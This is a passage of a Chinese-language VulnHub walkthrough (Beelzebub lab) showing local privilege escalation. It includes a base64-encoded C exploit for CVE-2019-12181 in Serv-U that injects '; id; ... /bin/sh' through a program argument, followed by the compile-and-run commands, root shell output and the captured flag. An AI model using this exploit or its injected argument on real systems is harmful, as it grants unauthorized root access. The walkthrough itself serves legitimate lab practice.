+</span></span><span style="display:flex;"><span>LyoNCg0KQ1ZFLTIwMTktMTIxODEgU2Vydi1VIDE1LjEuNiBQcml2aWxlZ2UgRXNjYWxhdGlvbiANCg0KdnVsbmVyYWJpbGl0eSBmb3VuZCBieToNCkd1eSBMZXZpbiAoQHZhX3N0YXJ0IC0gdHdpdHRlci5jb20vdmFfc3RhcnQpIGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldg0KDQp0byBjb21waWxlIGFuZCBydW46DQpnY2Mgc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYyAtbyBwZSAmJiAuL3BlDQoNCiovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQoNCmludCBtYWluKCkNCnsgICAgICAgDQogICAgY2hhciAqdnVsbl9hcmdzW10gPSB7IlwiIDsgaWQ7IGVjaG8gJ29wZW5pbmcgcm9vdCBzaGVsbCcgOyAvYmluL3NoOyBcIiIsICItcHJlcGFyZWluc3RhbGxhdGlvbiIsIE5VTEx9Ow0KICAgIGludCByZXRfdmFsID0gZXhlY3YoIi91c3IvbG9jYWwvU2Vydi1VL1NlcnYtVSIsIHZ1bG5fYXJncyk7DQogICAgLy8gaWYgZXhlY3YgaXMgc3VjY2Vzc2Z1bCwgd2Ugd29uJ3QgcmVhY2ggaGVyZQ0KICAgIHByaW50ZigicmV0IHZhbDogJWQgZXJybm86ICVkXG4iLCByZXRfdmFsLCBlcnJubyk7DQogICAgcmV0dXJuIGVycm5vOw0KfQ<span style="color:#ff6ac1">==</span>  </span></span></code></pre></div><p><code>-w</code>全写<code>--wrap</code>，指定编码后每行最多多少字符，而<code>0</code>表示不换行（禁用自动换行），输出的Base64字符串是一整行</p>
+<p>在靶机krampus的shell中运行：</p>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span>krampus@beelzebub:~$ <span style="color:#ff5c57">cd</span> /tmp
+</span></span><span style="display:flex;"><span>krampus@beelzebub:/tmp$ <span style="color:#ff5c57">echo</span> <span style="color:#5af78e">&#34;LyoNCg0KQ1ZFLTIwMTktMTIxODEgU2Vydi1VIDE1LjEuNiBQcml2aWxlZ2UgRXNjYWxhdGlvbiANCg0KdnVsbmVyYWJpbGl0eSBmb3VuZCBieToNCkd1eSBMZXZpbiAoQHZhX3N0YXJ0IC0gdHdpdHRlci5jb20vdmFfc3RhcnQpIGh0dHBzOi8vYmxvZy52YXN0YXJ0LmRldg0KDQp0byBjb21waWxlIGFuZCBydW46DQpnY2Mgc2VydnUtcGUtY3ZlLTIwMTktMTIxODEuYyAtbyBwZSAmJiAuL3BlDQoNCiovDQoNCiNpbmNsdWRlIDxzdGRpby5oPg0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPGVycm5vLmg+DQoNCmludCBtYWluKCkNCnsgICAgICAgDQogICAgY2hhciAqdnVsbl9hcmdzW10gPSB7IlwiIDsgaWQ7IGVjaG8gJ29wZW5pbmcgcm9vdCBzaGVsbCcgOyAvYmluL3NoOyBcIiIsICItcHJlcGFyZWluc3RhbGxhdGlvbiIsIE5VTEx9Ow0KICAgIGludCByZXRfdmFsID0gZXhlY3YoIi91c3IvbG9jYWwvU2Vydi1VL1NlcnYtVSIsIHZ1bG5fYXJncyk7DQogICAgLy8gaWYgZXhlY3YgaXMgc3VjY2Vzc2Z1bCwgd2Ugd29uJ3QgcmVhY2ggaGVyZQ0KICAgIHByaW50ZigicmV0IHZhbDogJWQgZXJybm86ICVkXG4iLCByZXRfdmFsLCBlcnJubyk7DQogICAgcmV0dXJuIGVycm5vOw0KfQ==&#34;</span> | base64 -d &gt; /tmp/47009.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>krampus@beelzebub:/tmp$ ls -l /tmp/47009.c
+</span></span><span style="display:flex;"><span>-rw-rw-r-- <span style="color:#ff9f43">1</span> krampus krampus <span style="color:#ff9f43">619</span> Jun <span style="color:#ff9f43">11</span> 18:23 /tmp/47009.c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>krampus@beelzebub:/tmp$ gcc -o exploit 47009.c
+</span></span><span style="display:flex;"><span>krampus@beelzebub:/tmp$ ./exploit
+</span></span><span style="display:flex;"><span><span style="color:#ff5c57">uid</span><span style="color:#ff6ac1">=</span>0<span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">gid</span><span style="color:#ff6ac1">=</span>0<span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span> <span style="color:#ff5c57">groups</span><span style="color:#ff6ac1">=</span>0<span style="color:#ff6ac1">(</span>root<span style="color:#ff6ac1">)</span>,4<span style="color:#ff6ac1">(</span>adm<span style="color:#ff6ac1">)</span>,24<span style="color:#ff6ac1">(</span>cdrom<span style="color:#ff6ac1">)</span>,30<span style="color:#ff6ac1">(</span>dip<span style="color:#ff6ac1">)</span>,33<span style="color:#ff6ac1">(</span>www-data<span style="color:#ff6ac1">)</span>,46<span style="color:#ff6ac1">(</span>plugdev<span style="color:#ff6ac1">)</span>,116<span style="color:#ff6ac1">(</span>lpadmin<span style="color:#ff6ac1">)</span>,126<span style="color:#ff6ac1">(</span>sambashare<span style="color:#ff6ac1">)</span>,1000<span style="color:#ff6ac1">(</span>krampus<span style="color:#ff6ac1">)</span>
+</span></span><span style="display:flex;"><span>opening root shell
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># cd /root</span>
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># ls</span>
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span><span style="color:#78787e"># cat root.txt</span>
+</span></span><span style="display:flex;"><span>8955qpasq8qq807879p75e1rr24cr1a5</span></span></code></pre></div><ul>
+<li><code>gcc</code>是linux的c语言编译器，<code>-o</code>是输出参数，<code>exploit</code>是生成的文件名字，源代码是<code>47009.c</code></li>
+<li><code>./exploit</code>是运行当前目录下可执行文件，<code>.</code>代表&quot;当前所在的目录&quot;，<code>/</code>代表路径分隔符</li>
+<li><code>uid=0(root)</code>代表身份是超级管理员，<code>gid=0(root)</code>代表现在属于root管理组，<code>groups</code>显示除了root组外，还保留原用户<code>krampus</code>所在的组（<code>adm</code>，<code>cdrom</code>，<code>sudo</code>），这是因为提权脚本劫持父进程权限，在当前会话中产生了一个具有root权限的子shell</li>
+<li><code>opening root shell</code>是<code>47009.c</code>脚本中<code>printf</code>函数输出的一行文字，命令提示符从<code>$</code>变为<code>#</code>，代表root</li>
+<li>接着读取/root/root.txt中的root flag</li>
+</ul>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+<a class="flex align-center" href="https://github.com/vnccer/vnccer.github.io/commit/f3118057084fd8b2fe3a55f39976eb54236450cb" title='Last modified by vnccer | May 15, 2026' target="_blank" rel="noopener">
+    <img src="/icons/calendar.svg" class="book-icon" alt="Calendar" />
+    <span>May 15, 2026</span>
+  </a>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_doubletrouble_1/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>doubletrouble: 1</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/cybersecurity/vulnhub/easy/vulnhub_Empire_Breakout/" class="flex align-center">
+        <span>Empire Breakout</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#beelzebub">Beelzebub</a>
+      <ul>
+        <li><a href="#识别目标主机ip地址">识别目标主机IP地址</a></li>
+        <li><a href="#nmap扫描">NMAP扫描</a></li>
+        <li><a href="#获得shell">获得shell</a></li>
+        <li><a href="#提权">提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
